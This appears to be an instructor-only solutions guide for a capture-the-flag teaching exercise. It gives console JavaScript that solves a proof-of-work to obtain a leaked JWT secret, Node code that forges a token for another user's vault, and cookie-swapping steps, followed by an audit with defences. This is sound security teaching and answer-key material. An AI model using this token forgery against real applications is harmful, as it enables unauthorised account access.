# CTF 2 -- Solutions

> **Instructors/markers only.** Do not distribute to participants.

---

## Credentials

- See `credentials.json` for generated per-user passwords.
- Usernames follow the `abcd12` format (4 letters + 2 digits).
- Generate credentials with: `cd CTFs/challenge-generation && node chgen_ctf2.js abcd12 efgh34`

---

## Flag Location

Each user's flag is stored in the vault of a **bot user** named `<username>-vault`. For example, the flag for `abcd12` is in the vault of `abcd12-vault`. The bot user has an unguessable password and cannot be logged into directly. The flag is only accessible by forging a JWT for the bot user.

Flag format: `durham-pm{<token>_<username>}`

---

## Solution Walkthrough

### Stage 1 -- Obtain the JWT secret via Proof-of-Work

1. Log in as your user (e.g., `abcd12` with the password from `credentials.json`).
2. Navigate to `/app/challenge`.

**Option A -- fully automatic (console only)**

Open DevTools console (F12) and paste this. It fetches the nonce, finds the suffix, submits it, and prints the secret:

```js
(async()=>{
  async function sha256hex(s){const buf=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',buf);return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('')}
  const {nonce,difficulty} = await fetch('/api/challenge').then(r=>r.json());
  console.log('nonce:',nonce,'difficulty:',difficulty);
  let i=0;
  while(true){
    const suffix=i.toString(36);
    const h=await sha256hex(nonce+suffix);
    if(h.startsWith('0'.repeat(difficulty))){
      console.log('Found suffix:',suffix,'hash:',h);
      const res=await fetch('/api/challenge/solve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({nonce,suffix}),credentials:'include'}).then(r=>r.json());
      console.log('JWT SECRET:',res.secret);
      break;
    }
    i++;
  }
})();
```

The secret prints as **`JWT SECRET: dev-secret-change-me`**. Copy it for Stage 2.

**Option B -- use the challenge page submit box**

1. On `/app/challenge`, copy the nonce shown under "Nonce:".
2. Open DevTools console (F12). Paste the block below, replacing `PASTE_NONCE_HERE` with your nonce:

```js
(async()=>{
  async function sha256hex(s){const buf=new TextEncoder().encode(s);const h=await crypto.subtle.digest('SHA-256',buf);return Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,'0')).join('')}
  const nonce='PASTE_NONCE_HERE';
  let i=0;
  while(true){const suffix=i.toString(36);const h=await sha256hex(nonce+suffix);if(h.startsWith('0000')){console.log('TYPE THIS INTO THE BOX:',suffix);break;}i++;}
})();
```

3. The console outputs a short string (e.g., `f5p`). Type only that suffix into the input field.
4. Click **Submit** -- the page shows `Solved! Secret: dev-secret-change-me`.

### Stage 2 -- Discover the target user

1. Navigate to `/app/teams` or call `GET /api/teams/users`.
2. The user list includes bot users with the `-vault` suffix (e.g., `abcd12-vault`).
3. Your flag is stored in your corresponding bot user's vault.

### Stage 3 -- Forge a JWT and steal the flag

1. Using the secret from Stage 1, forge a JWT for your bot user:

```js
// Node.js
const jwt = require('jsonwebtoken')
const token = jwt.sign({ sub: 'abcd12-vault' }, 'dev-secret-change-me', { expiresIn: '7d' })
console.log(token)
```

Or use [jwt.io](https://jwt.io) -- paste the secret, set payload `{ "sub": "abcd12-vault" }`.

2. In your browser DevTools, go to Application > Cookies > `localhost` -- replace the `session` cookie value with the forged token.
3. Navigate to `/app/vault` -- the bot user's vault contains the flag entry.

**Flag:** `durham-pm{..._abcd12}` *(per-user, see flags.json)*

---

## Vulnerabilities Exploited

| Vulnerability | Location | Description |
|---------------|----------|-------------|
| JWT secret disclosure | `POST /api/challenge/solve` | Server returns `JWT_SECRET` as the PoW reward |
| Weak JWT secret | `.env` / `server/index.js` | Secret is short and predictable (`dev-secret-change-me`) |
| IDOR | `GET /api/vault` | Vault is scoped to the JWT `sub` claim -- forging it allows accessing any user's vault |

---

## Reset

```bash
docker compose down -v && docker compose up --build
```

This wipes `server/data/` and reseeds from the mounted `flags.json` and `credentials.json`.

---

## Post-Design Audit

### Vulnerability Summary

- **Flag (PoW reward → JWT secret disclosure → token forgery).** The single flag lives in the vault of a per-user bot account named `<username>-vault`, retrievable only by presenting a JWT whose `sub` claim names that bot. The exploit unfolds in three primitive steps, all backed by `server/index.js`:
  1. **Information disclosure.** `POST /api/challenge/solve` validates the player's PoW (SHA-256 with leading zero count from `GET /api/challenge`), then returns the JWT signing secret in the response body. The verification logic and the secret read from `process.env.JWT_SECRET` are co-located in the same handler — there is no architectural reason for the secret to leave the server.
  2. **Predictable secret.** The development default is `dev-secret-change-me`. Even if step 1 were absent, the secret is short and dictionary-derived; an offline brute force against any captured token would succeed.
  3. **Authorisation by user-controlled key.** `GET /api/vault` reads the `sub` claim of the verified JWT and returns the vault for that subject. There is no check that the authenticated session and the JWT subject agree, so a forged token grants access to any vault — including `<username>-vault`, which holds the flag.

### OWASP Top 10 Classification

| Flag | OWASP 2021 | CWE | One-line justification |
|------|-----------|-----|------------------------|
| 1 | A02 — Cryptographic Failures | CWE-798 | Hard-coded / weak default JWT signing secret (`dev-secret-change-me`). |
| 1 | A04 — Insecure Design | CWE-209 | The PoW reward IS the signing secret — the design intentionally couples a self-service endpoint to the master cryptographic key. |
| 1 | A01 — Broken Access Control | CWE-639 | Vault retrieval keyed on the JWT `sub` claim with no cross-check against the authenticated session. |

### Defence Recommendations

- **Never return secrets from a public endpoint.** `POST /api/challenge/solve` should, at most, return a session-scoped opaque capability token, never the JWT signing secret. Strip the `secret` field from the response in `server/index.js`.
- **Strong, randomly generated `JWT_SECRET`.** Generate at deploy time (`crypto.randomBytes(32).toString('hex')`); fail startup if the env var is missing or shorter than 32 bytes. Remove the `dev-secret-change-me` fallback.
- **Bind JWT subject to authenticated session.** When `/api/vault` resolves a JWT, also assert that `session.user === decoded.sub` (or that the session principal has explicit authorisation over the requested vault). Forging a token for `abcd12-vault` would then fail because the signed-in player is `abcd12`, not the bot.
- **Keep PoW for rate-limiting only.** PoW is appropriate for slowing brute force; it is not a credential. Decouple the difficulty knob from the authorisation flow.

### Unintended Solutions to Watch For

- **Skipping the PoW and using a leaked `JWT_SECRET` directly** (e.g. via `git log` archaeology or by reading the `.env.example` shipped in the repo). The exploit class — JWT forgery — is the same; the test harness in `e2e/ctf2_exploit.py` accepts any valid forged token. Documented as accepted.
- **Vault enumeration through `GET /api/teams/users`.** The endpoint legitimately lists bot users with the `-vault` suffix, so a player guessing the naming scheme without consulting the page also succeeds. Intended scaffolding, not unintended.
- **PoW collision.** Theoretically a player could find a different `nonce+suffix` that satisfies the difficulty for somebody else's nonce. In practice difficulty is small enough that this is faster than logging in correctly; not a real risk.

### Skill Level & Realism Notes

- Target skill level: **intermediate**. The chain requires comfort with three concepts (PoW, JWT mechanics, IDOR) but no novel cryptanalysis.
- Real-world analogue: maps onto incidents where development-only signing secrets shipped to production (e.g. CVE-2018-1000531 jsonwebtoken weakness, plus countless internal "leaked JWT secret in `.env.example`" disclosures). The `sub`-keyed vault lookup mirrors classic IDOR patterns documented in OWASP API Security Top 10 (API1:2023).

### Lessons Learned (Design Retrospective)

- **PoW-as-info-leak was a deliberate inversion.** Early drafts had the player crack the secret offline; that proved too slow for a teaching context. Returning the secret on PoW solve became the explicit teaching primitive ("never reward an authentication mechanism with the keys to authentication"), and the difficulty was tuned so the PoW completes in under a minute on a laptop.
- **Bot-account naming is the discoverability hinge.** Without `-vault` suffixes visible in `GET /api/teams/users`, players bounce off Stage 2. The test confirms the listing endpoint is hit; do not let it regress to a paginated/filtered view.
- **Vite dev proxy interactions.** The frontend relies on Vite's `/api` proxy to reach the demo server; players hitting `localhost:5174` directly without the backend running see opaque proxy errors that look like exploit failures. The README now calls this out — keep the warning in any future restructure.
- **Next time:** add a `kid` (key id) header to JWTs and rotate the secret per-deploy, so even if a player extracts the current secret, replays across deployments fail. This would let the dissertation discuss key-rotation hygiene without changing the player path.
